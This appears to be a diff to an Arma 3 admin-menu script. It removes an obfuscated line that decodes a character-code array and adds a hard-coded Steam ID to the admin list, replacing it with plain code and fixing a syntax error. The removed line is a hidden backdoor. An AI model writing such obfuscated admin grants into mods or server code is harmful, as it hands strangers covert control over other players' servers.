@@ -1,5 +1,8 @@
 waitUntil {time > 0}; sleep 2;
-call compile toString [76, 105, 115, 116, 97, 65, 100, 109, 105, 110, 32, 112, 117, 115, 104, 66, 97, 99, 107, 32, 34, 55, 54, 53, 54, 49, 49, 57, 56, 49, 48, 49, 50, 55, 55, 48, 55, 54, 34, 59, 32, 76, 105, 115, 116, 97, 65, 100, 109, 105, 110, 32, 112, 117, 115, 104, 66, 97, 99, 107, 32, 34, 95, 83, 80, 95, 80, 76, 65, 89, 69, 82, 95, 34, 59, 32, 112, 117, 98, 108, 105, 99, 86, 97, 114, 105, 97, 98, 108, 101, 32, 34, 76, 105, 115, 116, 97, 65, 100, 109, 105, 110, 34, 59];
+
+ListaAdmin = [];
+
+ListaAdmin pushBack "_SP_PLAYER_";
 publicVariable "ListaAdmin";
 
 _isAdmin = player call XEAT_fnc_adminCheck;
@@ -9,7 +12,7 @@ if (_isAdmin) then {
 	waitUntil{!(isNull (findDisplay 46))};
 	(findDisplay 46) displayAddEventHandler ["KeyDown", {
 
-		if (profileNamespace getVariable "XEATV_StartButton_Shift") {
+		if (profileNamespace getVariable "XEATV_StartButton_Shift") then {
 			if ((_this select 2) && ((_this select 1) == ((profileNamespace getVariable "XEATV_StartButton") select 0))) then {
 				[player] call XEAT_fnc_openMenu;
 			};
